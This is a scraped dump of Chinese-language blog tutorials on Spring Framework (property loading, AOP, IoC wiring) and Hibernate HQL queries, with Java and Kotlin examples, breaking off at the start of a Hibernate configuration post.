import org.springframework.beans.factory.annotation.Value; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.context.annotation.PropertySource; import org.springframework.core.env.Environment; @Configuration @PropertySource(\u0026#34;classpath:/123.properties\u0026#34;) 指示加载属性文件至 Spring 中的 Environment public class AppConfig { @Bean public String str1(Environment environment) { 方式一：通过检索 Environment 获取属性 return environment.getProperty(\u0026#34;name\u0026#34;, \u0026#34;缺省值\u0026#34;); } @Bean public String str2(@Value(\u0026#34;${name:缺省值}\u0026#34;) String name) { 方式二：属性占位符 return name; } @Bean public String str3(@Value(\u0026#34;#{environment[\u0026#39;name\u0026#39;]?:\u0026#39;缺省值\u0026#39;}\u0026#34;) String name) { 方式三：SpEL return name; } } Main import org.springframework.context.annotation.AnnotationConfigApplicationContext; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); System.out.println(context.getBean(\u0026#34;str1\u0026#34;)); System.out.println(context.getBean(\u0026#34;str2\u0026#34;)); System.out.println(context.getBean(\u0026#34;str3\u0026#34;)); context.destroy(); } } ---- 输出： David David David 加载外部资源 Main import org.springframework.context.support.GenericXmlApplicationContext; import org.springframework.core.io.Resource; import java.io.IOException; public class Main { public static void main(String[] args) throws IOException { GenericXmlApplicationContext context = new GenericXmlApplicationContext(\u0026#34;123.xml\u0026#34;); Resource resource = context.getResource(\u0026#34;classpath:123.xml\u0026#34;); // Resource resource = context.getResource(\u0026#34;file:C:\\\\123.txt\u0026#34;); // Resource resource = context.getResource(\u0026#34;http://localhost/spring.png\u0026#34;); System.out.println(resource.getFilename()); System.out.println(resource.contentLength()); context.destroy(); } } ---- 输出： 123.xml 190 https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/core/io/ResourceLoader.html#getResource-java.lang.String- 面向切面编程 方法包装 无参 concert Performance package concert; public interface Performance { void perform(); } Concert package concert; import org.springframework.stereotype.Component; @Component public class Concert implements Performance { @Override public void perform() { System.out.println(\u0026#34;音乐会演奏..\u0026#34;); } } Audience package concert; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.annotation.*; import org.springframework.stereotype.Component; @Aspect 指示该类为切面 @Component 指示该类为组件（Bean） public class Audience { 切面 @Pointcut(\u0026#34;execution(* concert.Performance.perform(..))\u0026#34;) 切点 public void performance() { } ------------------------------------------------------- 第一种方式 @Before(\u0026#34;performance()\u0026#34;) 前置通知 public void a() { System.out.println(\u0026#34;观众入场就座\u0026#34;); } @Before(\u0026#34;performance()\u0026#34;) 前置通知 public void b() { System.out.println(\u0026#34;观众关闭手机\u0026#34;); } @AfterReturning(\u0026#34;performance()\u0026#34;) 后置通知（成功返回） public void c() { System.out.println(\u0026#34;观众鼓掌喝彩\u0026#34;); } @AfterThrowing(\u0026#34;performance()\u0026#34;) 后置通知（发生异常） public void d() { System.out.println(\u0026#34;观众要求退款\u0026#34;); } ------------------------------------------------------- 第二种方式 @Around(\u0026#34;performance()\u0026#34;) 环绕通知 public Object x(ProceedingJoinPoint pjp) { Object o = null; try { System.out.println(\u0026#34;观众入场就座\u0026#34;); System.out.println(\u0026#34;观众关闭手机\u0026#34;); o = pjp.proceed(); System.out.println(\u0026#34;观众鼓掌喝彩\u0026#34;); } catch (Throwable e) { System.out.println(\u0026#34;观众要求退款\u0026#34;); } return o; } } execution 匹配执行方法（连接点）。 AppConfig import org.springframework.context.annotation.ComponentScan; import org.springframework.context.annotation.Configuration; import org.springframework.context.annotation.EnableAspectJAutoProxy; @Configuration @EnableAspectJAutoProxy 启用 AspectJ 自动代理 @ComponentScan(\u0026#34;concert\u0026#34;) public class AppConfig { } Main import concert.Performance; import org.springframework.context.annotation.AnnotationConfigApplicationContext; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); Performance performance = context.getBean(Performance.class); performance.perform(); System.out.println(performance.getClass()); context.destroy(); } } ---- 输出： 观众入场就座 观众关闭手机 音乐会演奏.. 观众鼓掌喝彩 class com.sun.proxy.$Proxy16 使用基于接口的代理（推荐） 有参 log Log package log; import org.springframework.stereotype.Component; @Component public class Log { public void print(Object o) { System.out.println(o); } } LogInterceptor package log; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Before; import org.aspectj.lang.annotation.Pointcut; import org.springframework.stereotype.Component; @Aspect @Component 组件（Bean） public class LogInterceptor { 切面 @Pointcut(\u0026#34;execution(* log.Log.print(Object)) \u0026amp;\u0026amp; args(i)\u0026#34;) 切点 public void logged(Object i) { } @Before(\u0026#34;logged(j)\u0026#34;) 前置通知 public void capture(Object j) { System.out.println(\u0026#34;捕获:\u0026#34; + j); } } execution 匹配执行方法（连接点）。 args 指示将被通知方法的入参传递给通知方法。（Arguments） AppConfig import org.springframework.context.annotation.ComponentScan; import org.springframework.context.annotation.Configuration; import org.springframework.context.annotation.EnableAspectJAutoProxy; @Configuration @EnableAspectJAutoProxy 启用 AspectJ 自动代理 @ComponentScan(\u0026#34;log\u0026#34;) public class AppConfig { } Main import log.Log; import org.springframework.context.annotation.AnnotationConfigApplicationContext; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); Log log = context.getBean(Log.class); log.print(1); log.print(2); log.print(\u0026#34;A\u0026#34;); System.out.println(log.getClass()); context.destroy(); } } ---- 输出： 捕获:1 1 捕获:2 2 捕获:A A class log.Log$$EnhancerBySpringCGLIB$$72b5a387 由于 Bean 未实现任何接口，使用 CGLib 生成基于类的代理（不推荐） 方法引入 Kotlin 原生支持扩展函数。\n","permalink":"https://xhstormr.github.io/blog/posts/spring2/","summary":"","title":"Spring Framework"},{"content":"Updated on 2017-07-11\nhttps://spring.io/projects\nhttps://github.com/spring-projects/spring-framework\nhttps://github.com/spring-projects/spring-boot\nDependency\nSpring Doc | Spring API\nSpring Boot Doc | Spring Boot API\nSpring Security Doc | Spring Security API\nSpring Data JPA Doc | Spring Data JPA API\nConcept 控制反转（IOC）：应用程序本身不负责依赖对象的创建与维护，而是由外部容器负责管理。 依赖注入（DI）是其实现方式。 依赖对象 通过接口 了解注入对象并 表明依赖关系。（面向接口编程） 作用：负责 创建 对象并 维护 对象之间的依赖关系，使应用对象彼此之间保持 低耦合。 对象解耦。 面向切面编程（AOP）：用另一种编程架构的思想来 补充面向对象编程（OOP）的思想。 AOP 进行 提取，OOP 进行 封装。 AOP 主要的模块单元是 切面（Aspect），而 OOP 主要的模块单元是 类（Class）。 作用：使诸如日志管理等分散在各个应用对象的 逻辑（横切关注点）模块化为切面。 功能解耦。 装配：Wiring。 感知：Aware。 组件：@Component 控制层：@Controller 业务层：@Service 持久层：@Repository Configuration build.gradle.kts compile(\u0026#34;org.springframework:spring-context:+\u0026#34;) compile(\u0026#34;org.springframework:spring-aspects:+\u0026#34;) 装配方式 组件扫描和自动装配（隐式装配） soundsystem CompactDisc package soundsystem; public interface CompactDisc { void play(); } MediaPlayer package soundsystem; public interface MediaPlayer { void play(); } SgtPeppers package soundsystem; import org.springframework.stereotype.Component; @Component 组件（Java 规范中的 Named 作用与其相同） public class SgtPeppers implements CompactDisc { private final String title = \u0026#34;Sgt. Pepper\u0026#39;s Lonely Hearts Club Band\u0026#34;; private final String artist = \u0026#34;The Beatles\u0026#34;; @Override public void play() { System.out.println(\u0026#34;Playing \u0026#34; + title + \u0026#34; by \u0026#34; + artist); } } Bean 名称的缺省值为类名（首字母小写）（@Component）。 CDPlayer package soundsystem; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Component; @Component 组件（Java 规范中的 Named 作用与其相同） public class CDPlayer implements MediaPlayer { private CompactDisc cd; @Autowired 自动装配（Java 规范中的 Inject 作用与其相同） public CDPlayer(CompactDisc cd) { 构造注入 this.cd = cd; } @Override public void play() { cd.play(); } } AppConfig import org.springframework.context.annotation.ComponentScan; import org.springframework.context.annotation.Configuration; @Configuration 指示为配置类 @ComponentScan(basePackages = {\u0026#34;soundsystem\u0026#34;}) 组件扫描（搜寻其他 Component 和 Configuration） public class AppConfig { } Main import org.springframework.context.annotation.AnnotationConfigApplicationContext; import soundsystem.CDPlayer; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); CDPlayer cdPlayer = context.getBean(CDPlayer.class); cdPlayer.play(); context.destroy(); } } ---- 输出： Playing Sgt. Pepper\u0026#39;s Lonely Hearts Club Band by The Beatles Java 注解（显式装配） soundsystem CompactDisc package soundsystem; public interface CompactDisc { void play(); } MediaPlayer package soundsystem; public interface MediaPlayer { void play(); } SgtPeppers package soundsystem; public class SgtPeppers implements CompactDisc { private final String title = \u0026#34;Sgt. Pepper\u0026#39;s Lonely Hearts Club Band\u0026#34;; private final String artist = \u0026#34;The Beatles\u0026#34;; @Override public void play() { System.out.println(\u0026#34;Playing \u0026#34; + title + \u0026#34; by \u0026#34; + artist); } } CDPlayer package soundsystem; public class CDPlayer implements MediaPlayer { private CompactDisc cd; public CDPlayer(CompactDisc cd) { this.cd = cd; } @Override public void play() { cd.play(); } } AppConfig import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import soundsystem.CDPlayer; import soundsystem.CompactDisc; import soundsystem.MediaPlayer; import soundsystem.SgtPeppers; @Configuration 指示为配置类（用于定义 Bean） public class AppConfig { @Bean 指示该方法返回 Bean 对象并在容器中注册 public CompactDisc sgtPeppers() { return new SgtPeppers(); } @Bean 指示该方法返回 Bean 对象并在容器中注册 public MediaPlayer cdPlayer(CompactDisc cd) { 从容器中获取依赖对象 return new CDPlayer(cd); 并注入（装配） } } Bean 名称的缺省值为方法名（@Bean）。 Main import org.springframework.context.annotation.AnnotationConfigApplicationContext; import soundsystem.CDPlayer; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); CDPlayer cdPlayer = context.getBean(CDPlayer.class); cdPlayer.play(); context.destroy(); } } ---- 输出： Playing Sgt. Pepper\u0026#39;s Lonely Hearts Club Band by The Beatles XML 文件（显式装配） soundsystem CompactDisc package soundsystem; public interface CompactDisc { void play(); } MediaPlayer package soundsystem; public interface MediaPlayer { void play(); } SgtPeppers package soundsystem; public class SgtPeppers implements CompactDisc { private final String title = \u0026#34;Sgt. Pepper\u0026#39;s Lonely Hearts Club Band\u0026#34;; private final String artist = \u0026#34;The Beatles\u0026#34;; @Override public void play() { System.out.println(\u0026#34;Playing \u0026#34; + title + \u0026#34; by \u0026#34; + artist); } } CDPlayer package soundsystem; public class CDPlayer implements MediaPlayer { private CompactDisc cd; public CDPlayer(CompactDisc cd) { this.cd = cd; } @Override public void play() { cd.play(); } } Main import org.springframework.context.support.GenericXmlApplicationContext; import soundsystem.CDPlayer; public class Main { public static void main(String[] args) { GenericXmlApplicationContext context = new GenericXmlApplicationContext(\u0026#34;123.xml\u0026#34;); CDPlayer cdPlayer = context.getBean(CDPlayer.class); cdPlayer.play(); context.destroy(); } } ---- 输出： Playing Sgt. Pepper\u0026#39;s Lonely Hearts Club Band by The Beatles 123.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE beans PUBLIC \u0026#34;-//SPRING//DTD BEAN 2.0//EN\u0026#34; \u0026#34;http://www.springframework.org/dtd/spring-beans-2.0.dtd\u0026#34;\u0026gt; \u0026lt;beans\u0026gt; \u0026lt;bean id=\u0026#34;sgtPeppers\u0026#34; class=\u0026#34;soundsystem.SgtPeppers\u0026#34;/\u0026gt; 声明 Bean 并指定名称 \u0026lt;bean class=\u0026#34;soundsystem.CDPlayer\u0026#34;\u0026gt; 声明 Bean，缺省名称为 \u0026#34;soundsystem.CDPlayer#0\u0026#34; \u0026lt;constructor-arg ref=\u0026#34;sgtPeppers\u0026#34;/\u0026gt; 强制依赖的注入可使用构造方法（构造注入） ---- \u0026lt;property name=\u0026#34;cd\u0026#34; ref=\u0026#34;sgtPeppers\u0026#34;/\u0026gt; 可选依赖的注入可使用 Setter（设值注入） 对应 Setter： public void setCd(CompactDisc cd) { this.cd = cd; } \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 混合使用 cd-config.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE beans PUBLIC \u0026#34;-//SPRING//DTD BEAN 2.0//EN\u0026#34; \u0026#34;http://www.springframework.org/dtd/spring-beans-2.0.dtd\u0026#34;\u0026gt; \u0026lt;beans\u0026gt; \u0026lt;bean class=\u0026#34;soundsystem.SgtPeppers\u0026#34;/\u0026gt; \u0026lt;/beans\u0026gt; PlayerConfig import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import soundsystem.CDPlayer; import soundsystem.CompactDisc; import soundsystem.MediaPlayer; @Configuration 指示为配置类 public class PlayerConfig { @Bean public MediaPlayer cdPlayer(CompactDisc cd) { return new CDPlayer(cd); } } AppConfig import org.springframework.context.annotation.Configuration; import org.springframework.context.annotation.Import; import org.springframework.context.annotation.ImportResource; @Configuration @Import(PlayerConfig.class) 导入 Java 注解 @ImportResource(\u0026#34;cd-config.xml\u0026#34;) 导入 XML 文件 public class AppConfig { } Main import org.springframework.context.annotation.AnnotationConfigApplicationContext; import soundsystem.CDPlayer; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); CDPlayer cdPlayer = context.getBean(CDPlayer.class); cdPlayer.play(); context.destroy(); } } ---- 输出： Playing Sgt. Pepper\u0026#39;s Lonely Hearts Club Band by The Beatles ","permalink":"https://xhstormr.github.io/blog/posts/spring/","summary":"","title":"Spring Framework"},{"content":"Updated on 2017-05-19\n面向对象的查询语言\nselect\u0026hellip; + from\u0026hellip; + where\u0026hellip; + group by\u0026hellip; + having\u0026hellip; + order by\u0026hellip;\nhttp://docs.huihoo.com/hibernate/reference-v3_zh-cn/queryhql.html\n检索对象：from sessionFactory.currentSession.use { it.beginTransaction() val query = it.createQuery(\u0026#34;from Customer\u0026#34;, Customer::class.java) query.list().forEach { println(it.name) } val query = it.createQuery(\u0026#34;from Commodity c,Seller s\u0026#34;, Array\u0026lt;Any\u0026gt;::class.java) 设置别名 query.list().forEach { println(Arrays.toString(it)) } 笛卡尓积 it.transaction.commit() } list() ：无视缓存并加载整个数据，发送 1 条 SQL 语句。 iterate()：检索缓存并延迟加载数据，发送 1+N 条 SQL 语句。 选择属性：select 单个属性： 原生对象 ---- val query = it.createQuery(\u0026#34;select birthday from Customer\u0026#34;, Date::class.java) query.list().forEach { println(it) } 数据去重 ---- val query = it.createQuery(\u0026#34;select distinct sex from Customer\u0026#34;, String::class.java) query.list().forEach { println(it) } 多个属性： 默认为 Array ---- val query = it.createQuery(\u0026#34;select name,address,tel from Seller\u0026#34;, Array\u0026lt;Any\u0026gt;::class.java) query.list().forEach { println(Arrays.toString(it)) } 指定为 List ---- val query = it.createQuery(\u0026#34;select new list(name,address,tel) from Seller\u0026#34;, List::class.java) query.list().forEach { println(it) } 指定为 Map ---- val query = it.createQuery(\u0026#34;select new map(name,address,tel) from Seller\u0026#34;, Map::class.java) query.list().forEach { println(\u0026#34;${it[\u0026#34;0\u0026#34;]} ${it[\u0026#34;1\u0026#34;]} ${it[\u0026#34;2\u0026#34;]}\u0026#34;) } ---- val query = it.createQuery(\u0026#34;select new map(name as n,address as a,tel as t) from Seller\u0026#34;, Map::class.java) 设置别名 query.list().forEach { println(\u0026#34;${it[\u0026#34;n\u0026#34;]} ${it[\u0026#34;a\u0026#34;]} ${it[\u0026#34;t\u0026#34;]}\u0026#34;) } 指定为自定义对象 Test ---- val query = it.createQuery(\u0026#34;select new Test(name,address,tel) from Seller\u0026#34;, Test::class.java) query.list().forEach { println(it) } Test data class Test(var s1: String, var s2: String, var s3: String) 限制范围：where 比较运算： =, !=, \u0026lt;, \u0026gt;, \u0026lt;=, \u0026gt;= ---- val query = it.createQuery(\u0026#34;from Commodity c where c.price\u0026gt;400\u0026#34;, Commodity::class.java) query.list().forEach { println(it.name) } 四则运算： +, -, *, / ---- val query = it.createQuery(\u0026#34;from Commodity c where c.price*5\u0026lt;2000\u0026#34;, Commodity::class.java) query.list().forEach { println(it.price) } 范围运算： [not] between v1 and v2 ---- val query = it.createQuery(\u0026#34;from Customer c where c.age between 20 and 35\u0026#34;, Customer::class.java) query.list().forEach { println(it.age) } 逻辑运算： and, or, not 且， 或， 非 ---- val query = it.createQuery(\u0026#34;from Commodity c where (c.price between 100 and 5000) and (c.category not like \u0026#39;%童装%\u0026#39;)\u0026#34;, Commodity::class.java) query.list().forEach { println(it.name) } 集合运算： 元素是否属于集合（参数为集合，value in ?）： [not] in (v1, v2, v3) ---- val query = it.createQuery(\u0026#34;from Customer c where c.age in (20,35)\u0026#34;, Customer::class.java) 底层使用 Statement 接口 query.list().forEach { println(it.age) } ---- val query = it.createQuery(\u0026#34;from Customer c where c.age in :values\u0026#34;, Customer::class.java) 底层使用 PreparedStatement 接口 query.setParameter(\u0026#34;values\u0026#34;, arrayListOf(20, 35)) 设置参数 query.list().forEach { println(it.age) } 元素是否属于集合（参数为元素，? in list）： [not] member of -\u0026gt; [not] in ---- val orderForm = it.get(OrderForm::class.java, 1) val query = it.createQuery(\u0026#34;from Customer c where :values member of c.orderforms\u0026#34;, Customer::class.java) query.setParameter(\u0026#34;values\u0026#34;, orderForm) 设置参数 query.list().forEach { println(it.name) } 集合是否为空集： is empty -\u0026gt; not exists is not empty -\u0026gt; exists ---- val query = it.createQuery(\u0026#34;select o.orderitems.size from OrderForm o where o.orderitems is not empty\u0026#34;, Integer::class.java) query.list().forEach { println(it) } 空值判断： is [not] null ---- val query = it.createQuery(\u0026#34;from Commodity c where c.description is null\u0026#34;, Commodity::class.java) query.list().forEach { println(it.name) } 字符串匹配： 精确匹配：like \u0026#39;张爱玲\u0026#39; 模糊匹配：like \u0026#39;张%\u0026#39; 通配符： %：任意字符 _：任意一个字符 ---- val query = it.createQuery(\u0026#34;from Customer c where c.address like \u0026#39;%北京%\u0026#39;\u0026#34;, Customer::class.java) query.list().forEach { println(it.address) } uniqueResult：查询结果最多只能有一个，否则抛出异常。 ---- val query = it.createQuery(\u0026#34;from Customer c where c.age\u0026gt;30\u0026#34;, Customer::class.java) val customer = query.uniqueResultOptional().orElse(Customer(name = \u0026#34;不存在\u0026#34;)) println(customer.name) 排序结果：order by 升序排序（由低到高）：asc 降序排序（由高到低）：desc val query = it.createQuery(\u0026#34;from Commodity c order by c.seller.id asc,c.price desc,c.name asc\u0026#34;, Commodity::class.java) 多排序规则 query.list().forEach { println(\u0026#34;${it.seller?.id} ${it.price} ${it.name}\u0026#34;) } ---- 输出： 1 200 女士套装 1 200 男士西服 1 120 中式童装 2 4000 笔记本电脑 2 400 移动硬盘 3 5000 液晶电视 3 4000 滚筒洗衣机 4 50 《Java核心》 4 40 《海底两万里》 4 30 《hibernate编程》 Code Seller（商家） import javax.persistence.* @Entity @NamedQuery(name = \u0026#34;allSeller\u0026#34;, query = \u0026#34;from Seller\u0026#34;) data class Seller( @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var name: String? = null, var tel: String? = null, var address: String? = null, var website: String? = null, var star: Int? = null, var business: String? = null, @OneToMany(mappedBy = \u0026#34;seller\u0026#34;, cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) val commoditys: MutableList\u0026lt;Commodity\u0026gt; = arrayListOf() ) { fun addCommodity(commodity: Commodity) { commoditys.add(commodity) commodity.seller = this } fun removeCommodity(commodity: Commodity) { commoditys.remove(commodity) commodity.seller = null } } Commodity（商品） import javax.persistence.* @Entity data class Commodity( @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var name: String? = null, var price: Int? = null, var unit: String? = null, var category: String? = null, var description: String? = null, @ManyToOne var seller: Seller? = null, @OneToMany(mappedBy = \u0026#34;commodity\u0026#34;, cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) val orderitems: MutableList\u0026lt;OrderItem\u0026gt; = arrayListOf() ) { fun addOrderItem(orderItem: OrderItem) { orderitems.add(orderItem) orderItem.commodity = this } fun removeOrderItem(orderItem: OrderItem) { orderitems.remove(orderItem) orderItem.commodity = null } } Customer（客户） import java.util.* import javax.persistence.* @Entity data class Customer( @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var name: String? = null, var tel: String? = null, var address: String? = null, var email: String? = null, var sex: String? = null, var description: String? = null, var age: Int? = null, var birthday: Date? = null, @OneToMany(mappedBy = \u0026#34;customer\u0026#34;, cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) val orderforms: MutableList\u0026lt;OrderForm\u0026gt; = arrayListOf() ) { fun addOrderForm(orderForm: OrderForm) { orderforms.add(orderForm) orderForm.customer = this } fun removeOrderForm(orderForm: OrderForm) { orderforms.remove(orderForm) orderForm.customer = null } } OrderForm（订单） import java.util.* import javax.persistence.* @Entity data class OrderForm( @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var tradedate: Date? = null, var status: String? = null, var amount: Int? = null, @ManyToOne var customer: Customer? = null, @OneToMany(mappedBy = \u0026#34;orderForm\u0026#34;, cascade = arrayOf(CascadeType.ALL), orphanRemoval = true) val orderitems: MutableList\u0026lt;OrderItem\u0026gt; = arrayListOf() ) { fun addOrderItem(orderItem: OrderItem) { orderitems.add(orderItem) orderItem.orderForm = this } fun removeOrderItem(orderItem: OrderItem) { orderitems.remove(orderItem) orderItem.orderForm = null } } OrderItem（订单明细） import javax.persistence.* @Entity data class OrderItem( @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var amount: Int? = null, var actprice: Int? = null, var discount: Int? = null, @ManyToOne var orderForm: OrderForm? = null, @ManyToOne var commodity: Commodity? = null ) A import org.hibernate.SessionFactory import org.hibernate.boot.MetadataSources import org.hibernate.boot.registry.StandardServiceRegistryBuilder import java.util.* val sessionFactory: SessionFactory by lazy { val registry = StandardServiceRegistryBuilder().configure().build() MetadataSources(registry).buildMetadata().buildSessionFactory() } fun main(args: Array\u0026lt;String\u0026gt;) { val seller1 = Seller(name = \u0026#34;A服装店\u0026#34;, tel = \u0026#34;13000000000\u0026#34;, address = \u0026#34;中国重庆市××区\u0026#34;, website = \u0026#34;www.a.com\u0026#34;, star = 5, business = \u0026#34;经营各种服装\u0026#34;) val seller2 = Seller(name = \u0026#34;B数码店\u0026#34;, tel = \u0026#34;15800000000\u0026#34;, address = \u0026#34;中国杭州市××区\u0026#34;, website = \u0026#34;www.b.com\u0026#34;, star = 4, business = \u0026#34;经营各种数码产品\u0026#34;) val seller3 = Seller(name = \u0026#34;C电器店\u0026#34;, tel = \u0026#34;16800000000\u0026#34;, address = \u0026#34;中国深圳市××区\u0026#34;, website = \u0026#34;www.c.com\u0026#34;, star = 4, business = \u0026#34;经营各种家电\u0026#34;) val seller4 = Seller(name = \u0026#34;D书籍店\u0026#34;, tel = \u0026#34;17600000000\u0026#34;, address = \u0026#34;中国西安市××区\u0026#34;, website = \u0026#34;www.d.com\u0026#34;, star = 5, business = \u0026#34;经营各种书籍\u0026#34;) val customer1 = Customer(name = \u0026#34;张三\u0026#34;, tel = \u0026#34;13800000000\u0026#34;, address = \u0026#34;中国上海××区××路\u0026#34;, email = \u0026#34;13800000000@138.com\u0026#34;, sex = \u0026#34;男\u0026#34;, age = 25, birthday = Date(), description = \u0026#34;热爱编程的程序员\u0026#34;) val customer2 = Customer(name = \u0026#34;李四\u0026#34;, tel = \u0026#34;13888888888\u0026#34;, address = \u0026#34;中国北京××区××路\u0026#34;, email = \u0026#34;13888888888@138.com\u0026#34;, sex = \u0026#34;女\u0026#34;, age = 20, birthday = Date(), description = \u0026#34;酷爱网购的白领\u0026#34;) val customer3 = Customer(name = \u0026#34;王五\u0026#34;, tel = \u0026#34;15888888888\u0026#34;, address = \u0026#34;中国深圳××区××路\u0026#34;, email = \u0026#34;15888888888@158.com\u0026#34;, sex = \u0026#34;男\u0026#34;, age = 35, birthday = Date(), description = \u0026#34;这个家伙很懒，什么也没有留下\u0026#34;) val commodity1 = Commodity(name = \u0026#34;中式童装\u0026#34;, price = 120, unit = \u0026#34;套\u0026#34;, category = \u0026#34;童装\u0026#34;, description = \u0026#34;中式童装\u0026#34;) val commodity2 = Commodity(name = \u0026#34;女士套装\u0026#34;, price = 200, unit = \u0026#34;套\u0026#34;, category = \u0026#34;女装\u0026#34;, description = \u0026#34;女士职业套装\u0026#34;) val commodity3 = Commodity(name = \u0026#34;男士西服\u0026#34;, price = 200, unit = \u0026#34;套\u0026#34;, category = \u0026#34;男装\u0026#34;, description = \u0026#34;男士西服套装\u0026#34;) val commodity4 = Commodity(name = \u0026#34;笔记本电脑\u0026#34;, price = 4000, unit = \u0026#34;台\u0026#34;, category = \u0026#34;电脑\u0026#34;, description = \u0026#34;双核笔记本电脑\u0026#34;) val commodity5 = Commodity(name = \u0026#34;移动硬盘\u0026#34;, price = 400, unit = \u0026#34;块\u0026#34;, category = \u0026#34;电脑周边\u0026#34;, description = \u0026#34;1T移动硬盘\u0026#34;) val commodity6 = Commodity(name = \u0026#34;液晶电视\u0026#34;, price = 5000, unit = \u0026#34;台\u0026#34;, category = \u0026#34;电视\u0026#34;, description = \u0026#34;4k液晶电视\u0026#34;) val commodity7 = Commodity(name = \u0026#34;滚筒洗衣机\u0026#34;, price = 4000, unit = \u0026#34;台\u0026#34;, category = \u0026#34;洗衣机\u0026#34;, description = \u0026#34;滚筒洗衣机\u0026#34;) val commodity8 = Commodity(name = \u0026#34;《hibernate编程》\u0026#34;, price = 30, unit = \u0026#34;\u0026#34;, category = \u0026#34;实体书\u0026#34;, description = \u0026#34;介绍hibernate编程\u0026#34;) val commodity9 = Commodity(name = \u0026#34;《Java核心》\u0026#34;, price = 50, unit = \u0026#34;\u0026#34;, category = \u0026#34;实体书\u0026#34;, description = \u0026#34;介绍Java编程核心\u0026#34;) val commodity10 = Commodity(name = \u0026#34;《海底两万里》\u0026#34;, price = 40, unit = \u0026#34;\u0026#34;, category = \u0026#34;电子书\u0026#34;, description = \u0026#34;经典科幻小说\u0026#34;) val orderForm1 = OrderForm(status = \u0026#34;已收货\u0026#34;, amount = 4400, tradedate = Date()) val orderForm2 = OrderForm(status = \u0026#34;已发货\u0026#34;, amount = 520, tradedate = Date()) val orderForm3 = OrderForm(status = \u0026#34;已付款\u0026#34;, amount = 9120, tradedate = Date()) val orderItem1 = OrderItem(discount = 1, amount = 1, actprice = 4000) val orderItem2 = OrderItem(discount = 1, amount = 1, actprice = 400) val orderItem3 = OrderItem(discount = 1, amount = 1, actprice = 120) val orderItem4 = OrderItem(discount = 1, amount = 1, actprice = 200) val orderItem5 = OrderItem(discount = 1, amount = 1, actprice = 200) val orderItem6 = OrderItem(discount = 1, amount = 1, actprice = 5000) val orderItem7 = OrderItem(discount = 1, amount = 1, actprice = 4000) val orderItem8 = OrderItem(discount = 1, amount = 1, actprice = 30) val orderItem9 = OrderItem(discount = 1, amount = 1, actprice = 50) val orderItem10 = OrderItem(discount = 1, amount = 1, actprice = 40) seller1.let { it.addCommodity(commodity1) it.addCommodity(commodity2) it.addCommodity(commodity3) } seller2.let { it.addCommodity(commodity4) it.addCommodity(commodity5) } seller3.let { it.addCommodity(commodity6) it.addCommodity(commodity7) } seller4.let { it.addCommodity(commodity8) it.addCommodity(commodity9) it.addCommodity(commodity10) } customer1.addOrderForm(orderForm1) customer2.addOrderForm(orderForm2) customer3.addOrderForm(orderForm3) orderForm1.let { it.addOrderItem(orderItem1) it.addOrderItem(orderItem2) } orderForm2.let { it.addOrderItem(orderItem3) it.addOrderItem(orderItem4) it.addOrderItem(orderItem5) } orderForm3.let { it.addOrderItem(orderItem6) it.addOrderItem(orderItem7) it.addOrderItem(orderItem8) it.addOrderItem(orderItem9) it.addOrderItem(orderItem10) } commodity1.addOrderItem(orderItem3) commodity2.addOrderItem(orderItem4) commodity3.addOrderItem(orderItem5) commodity4.addOrderItem(orderItem1) commodity5.addOrderItem(orderItem2) commodity6.addOrderItem(orderItem6) commodity7.addOrderItem(orderItem7) commodity8.addOrderItem(orderItem8) commodity9.addOrderItem(orderItem9) commodity10.addOrderItem(orderItem10) sessionFactory.currentSession.use { it.beginTransaction() it.save(seller1) it.save(seller2) it.save(seller3) it.save(seller4) it.save(customer1) it.save(customer2) it.save(customer3) it.transaction.commit() } sessionFactory.close() } ","permalink":"https://xhstormr.github.io/blog/posts/hibernate-hql/","summary":"","title":"Hibernate Query Language"},{"content":"Updated on 2017-05-14\nhttps://hibernate.org/orm/\nhttps://github.com/hibernate/hibernate-orm\nhttps://docs.jboss.org/hibernate/orm/current/javadocs/allclasses-noframe.html\nhttps://docs.jboss.org/hibernate/orm/current/userguide/html_single/Hibernate_User_Guide.html\nhttps://www.postgresql.org/docs/current/static/index.html\nhttps://jcenter.bintray.com/org/hibernate/hibernate-core/\nConfiguration build.gradle.kts compile(\u0026#34;org.postgresql:postgresql:+\u0026#34;) compile(\u0026#34;org.hibernate:hibernate-core:+\u0026#34;) hibernate.cfg.xml \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39;?\u0026gt; \u0026lt;!DOCTYPE hibernate-configuration PUBLIC \u0026#34;-//Hibernate/Hibernate Configuration DTD//EN\u0026#34; \u0026#34;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd\u0026#34;\u0026gt; \u0026lt;hibernate-configuration\u0026gt; \u0026lt;session-factory\u0026gt; \u0026lt;property 